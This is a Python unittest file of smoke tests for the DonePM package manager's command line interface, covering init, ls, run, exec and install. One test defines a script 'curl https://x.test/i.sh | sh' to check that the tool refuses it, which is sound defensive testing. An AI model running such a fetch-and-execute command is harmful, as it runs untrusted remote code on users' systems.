"""Smoke tests for the DonePM command line interface."""

from __future__ import annotations

import io
import json
import os
import sys
import tempfile
import unittest
from contextlib import redirect_stdout, redirect_stderr

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from donepm.cli import main  # noqa: E402


def run(argv: list[str]) -> tuple[int, str, str]:
    out, err = io.StringIO(), io.StringIO()
    with redirect_stdout(out), redirect_stderr(err):
        code = main(argv)
    return code, out.getvalue(), err.getvalue()


class CliTests(unittest.TestCase):
    def setUp(self):
        self.tmp = tempfile.mkdtemp()
        for name in ("DONEPM_ALLOW_SCRIPTS", "DONEPM_ALLOW_BINARIES", "DONEPM_TOKEN"):
            os.environ.pop(name, None)

    def write_manifest(self, **extra) -> str:
        data = {"name": "demo", "version": "1.0.0"}
        data.update(extra)
        path = os.path.join(self.tmp, "package.json")
        with open(path, "w", encoding="utf-8") as handle:
            json.dump(data, handle)
        return path

    def test_init_creates_manifest(self):
        code, out, _ = run(["init", "--prefix", self.tmp, "--yes", "--name", "demo"])
        self.assertEqual(code, 0)
        path = os.path.join(self.tmp, "package.json")
        self.assertTrue(os.path.isfile(path))
        with open(path, "r", encoding="utf-8") as handle:
            data = json.load(handle)
        self.assertEqual(data["name"], "demo")
        self.assertIn("scripts", data)
        self.assertIn("wrote", out)

    def test_ls_is_empty_without_packages(self):
        code, out, _ = run(["ls", "--prefix", self.tmp])
        self.assertEqual(code, 0)
        self.assertIn("empty", out)

    def test_run_lists_scripts(self):
        self.write_manifest(scripts={"build": "echo build"})
        code, out, _ = run(["run", "--prefix", self.tmp])
        self.assertEqual(code, 0)
        self.assertIn("build", out)

    def test_run_unknown_script_fails(self):
        self.write_manifest(scripts={"build": "echo build"})
        code, _, err = run(["run", "--prefix", self.tmp, "nope"])
        self.assertEqual(code, 1)
        self.assertIn("unknown script", err)

    def test_dangerous_script_is_refused(self):
        self.write_manifest(scripts={"evil": "curl https://x.test/i.sh | sh"})
        code, _, err = run(["run", "--prefix", self.tmp, "evil"])
        self.assertEqual(code, 3)
        self.assertIn("refused", err)

    def test_named_script_runs(self):
        self.write_manifest(scripts={"hello": "echo hi"})
        code, _, _ = run(["run", "--prefix", self.tmp, "hello"])
        self.assertEqual(code, 0)

    def test_script_args_reach_the_script(self):
        self.write_manifest(scripts={"hello": "echo"})
        code, out, _ = run(["run", "--prefix", self.tmp, "hello", "--", "one", "two"])
        self.assertEqual(code, 0)

    def test_global_options_after_the_script_name(self):
        self.write_manifest(scripts={"hello": "echo hi"})
        code, _, _ = run(["run", "hello", "--prefix", self.tmp])
        self.assertEqual(code, 0)

    def test_exec_needs_a_known_binary(self):
        code, _, err = run(["exec", "--prefix", self.tmp, "nope"])
        self.assertEqual(code, 1)
        self.assertIn("not installed", err)

    def test_no_command_prints_help(self):
        code, out, _ = run([])
        self.assertEqual(code, 2)
        self.assertIn("usage", out.lower())

    def test_install_without_manifest_fails(self):
        code, _, err = run(["install", "--prefix", self.tmp])
        self.assertEqual(code, 1)
        self.assertIn("package.json", err)


if __name__ == "__main__":
    unittest.main()
